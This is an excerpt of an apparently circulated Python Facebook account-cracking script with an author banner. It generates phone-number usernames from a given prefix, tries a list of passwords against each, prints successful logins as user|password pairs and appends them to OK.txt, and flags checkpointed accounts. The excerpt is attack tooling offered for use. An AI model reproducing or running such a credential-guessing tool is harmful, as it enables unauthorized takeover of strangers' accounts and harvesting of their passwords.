...
def banner():
	...
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %s𝐀𝐑𝐈𝐘𝐀𝐍                    %s║"%(Z,B,M,Z))
	print("%s║%s  FACEBOOK   : https://www.facebook.com/profile.php?id=100000521779367  %s║"%(Z,B,Z))
	print("%s║%s  YOUTUBE : Ariyan Ahmed Nazmul       %s║"%(Z,B,Z))
	print("%s║%s  Version  : %s3.0.0                          %s║"%(Z,B,H,Z))
	print("%s╚══════════════════════════════════════════╝"%(Z))
	print("")
...
def random_number():
	...
	print(f" {M}FOR EXAMPLE : {Z}[{H}+8801814401XXXX{Z}]\n")
	...
	try:
		for pw in pwx:
			...
			if "session_key" in result:
				print('\033[1;32m [ARIYAN-OK] '+user+'|'+pw+'\033[0;97m')
				open('OK.txt', 'a').write(user+'|'+pw+'\n')
				oks.append(user)
				break
			elif "www.facebook.com" in result["error_msg"]:
				print(result)
				print('\033[1;31m [ARIYAN-CP] '+user+'|'+pw+'\033[0;97m')
